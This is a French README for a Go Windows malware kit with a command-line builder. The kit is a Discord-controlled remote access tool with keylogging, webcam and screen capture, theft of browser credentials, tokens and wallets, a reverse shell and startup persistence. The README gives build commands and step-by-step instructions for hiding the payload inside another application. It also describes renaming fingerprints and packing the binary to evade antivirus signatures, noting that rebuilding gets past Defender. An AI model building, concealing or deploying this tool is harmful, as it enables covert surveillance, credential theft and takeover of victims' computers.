# francais2nd-payload-builder

Payload Windows en Go (module autonome) + **builder en ligne de commande** :
C2 Discord par commandes `!`, keylogger en temps réel avec salon dédié,
captures d'écran multi-écrans, photos de webcam sur salon dédié, extraction
d'identifiants de navigateurs
(DPAPI, Firefox inclus), reverse shell TCP (`cmd` ou PowerShell), persistance
démarrage Windows.

Le dépôt contient **du code source uniquement** : `payload.example.json` est
vierge (aucun jeton, aucun identifiant Discord), `payload.json` est gitignoré
— votre configuration réelle ne quitte jamais votre machine.

## Contenu

| Fichier | Rôle |
|---|---|
| `main.go` | Hôte autonome (sans fenêtre) : instance unique, `-diag`, `startPayload()` |
| `payload.go` | Configuration embarquée, cadences, transport Discord, journal local |
| `channel.go` | Salon `<machine>` + `<machine>-keylogs` + `<machine>-webcam` + **catégorie** Discord, créés à la demande par le bot |
| `c2.go` | C2 Discord : `!help`, `!shell`, `!shell_ps`, `!shell_tcp`, `!steal`, `!keylog`, `!screenshot`, `!webcam`, `!sysinfo`, `!licence`, `!elevate`, `!clip`, `!ls`, `!cat`, `!download`, `!persist`, `!stop` |
| `stealer.go` | DPAPI, bases navigateurs (Chromium + Firefox), jetons, portefeuilles, rapport machine |
| `firefox.go` | Décryptage Firefox (clé PBKDF2, `logins.json`/`key4.db`) |
| `keylogger.go` | Touches + fenêtre active + presse-papiers, horodatés, flux 5 s |
| `screenshot.go` | Capture GDI → PNG, un fichier par moniteur |
| `webcam.go` | Photo webcam PowerShell/WinRT (sans dépendance) → `<machine>-webcam` |
| `persist.go` | Copie de repli EdgeUpdate + clé Run HKCU + VBS Démarrage (UTF-16LE) |
| `winapi.go` | Registre, licences Windows, élévation UAC, IP publique |
| `cmd/builder` | Builder CLI (voir ci-dessous) |

## Compiler

Avec le builder (recommandé) :

```bat
go run ./cmd/builder -bot-token "VOTRE_JETON" -guild ID_SERVEUR -channel ID_SALON -out app.exe
```

Le builder lit `payload.example.json`, écrit `payload.json` (config réelle,
gitignorée) puis lance `go build -ldflags "-H windowsgui -s -w" -o app.exe .`

| Drapeau | Défaut | Rôle |
|---|---|---|
| `-bot-token`, `-guild`, `-channel` | **obligatoires** | jeton du bot, serveur, salon de repli |
| `-webhook` | vide | transport webhook Discord à la place du bot |
| `-out` | `payload.exe` | chemin de sortie |
| `-persist` | `true` | persistance démarrage Windows |
| `-shell`, `-shell-host`, `-shell-port` | `false`, vide, `4444` | reverse shell TCP sortant |
| `-steal` / `-keylog` / `-screenshot` / `-webcam` / `-exfil` | modèle | cadences en minutes (`-1` = modèle) |
| `-ldflags` | `-H windowsgui -s -w` | sans console, binaire élagué |
| `-src` | auto | dossier source si builder lancé ailleurs |

À la main, sans builder :

```bat
copy payload.example.json payload.json
go build -ldflags "-H windowsgui -s -w" -o app.exe .
```

Vérification : `app.exe -diag` écrit `diagnostic.txt` (l'exécutable n'a pas de
console, l'info va dans le fichier).

## Intégrer le payload dans une autre application

Le payload est indépendant de l'interface : il ne dépend d'aucun fichier HTML,
de WebView2 ni du reste de l'application d'origine. Pour le cacher dans un
autre exécutable Go existant :

1. **Copier** les fichiers `payload.go channel.go c2.go stealer.go firefox.go
   keylogger.go screenshot.go webcam.go persist.go winapi.go` + `payload.json`
   dans le
   projet cible (même module ou module requis).
2. **Fournir le seul symbole manquant** : `writeLog(string)`. Soit vous le
   recopiez depuis `main.go` de ce dépôt (avec `diagMode` et `-diag`), soit
   vous supprimez les lignes `if cfg.Debug { writeLog(...) }` dans
   `payload.go` si vous ne voulez pas de debug.
3. **Appeler `startPayload()`** une seule fois au démarrage, après votre
   init. Rien d'autre à faire : `//go:embed payload.json` est déjà dans
   `payload.go`, les goroutines s'auto-gèrent (garde panique, cadences,
   instance unique à assurer par le hôte si besoin).
4. **Options de hachage/furtivité** :
   - `-ldflags "-H windowsgui -s -w"` : pas de console, symboles retirés ;
   - icône/manifeste : `rsrc -manifest app.manifest -o rsrc.syso` puis
     `go build` (le .syso est lié automatiquement) ;
   - renommer l'exécutable et le versionner (`-ldflags "-s -w -H windowsgui
     -X main.version=1.2"`) ;
   - packer externe type UPX si le contour du binaire pose problème.
5. **Renommer les empreintes** (évite collisions et signatures nommées) —
   cherchez-les dans le code copié :
   - mutex `Local\Francais2ndInstance` (`singleInstance`, `main.go`) ;
   - valeur de registre `Francais2ndUpdate` et fichier
     `msedgewebview2_update.exe` (`persist.go`) ;
   - script `sysupdate.vbs` du Démarrage (`persist.go`) ;
   - dossier `%LOCALAPPDATA%\Francais2nd` (`payload.go`) ;
   - noms de salon/`hostChannelName` (`channel.go`) si vous voulez un autre
     préfixe de salons.
6. Recompiler. Le JSON embarqué ne change qu'à la compilation.

## État antivirus — constat honnête

Microsoft Defender détecte ce code (signature cloud, du 17/10/2026) : copie de
repli mise en quarantaine, clé Run retirée, lancement bloqué ; un build
recompilé repasse le filtre, mais la détection peut revenir à chaque mise à
jour. Ce dépôt ne fournit ni exclusion, ni contournement d'antivirus — la
persistance se réécrit toute seule via `persistRepair()`, et un rebuild est la
seule réponse documentée. Usage à tester sur vos propres machines.

## Usage des commandes

Une fois le payload lancé, tapez `!help` dans le salon Discord de la machine :
la liste complète (16 commandes) s'affiche. Les journaux de clavier arrivent
toutes les 5 s dans `<machine>-keylogs`, les photos de webcam toutes les
10 min dans `<machine>-webcam`, le tout classé dans la catégorie `<machine>`.
Fermer l'interface de l'application d'origine n'arrête pas le payload s'il
est intégré avec le mode worker (voir la version intégrée) ; ici, l'hôte
autonome vit jusqu'à `!stop`.
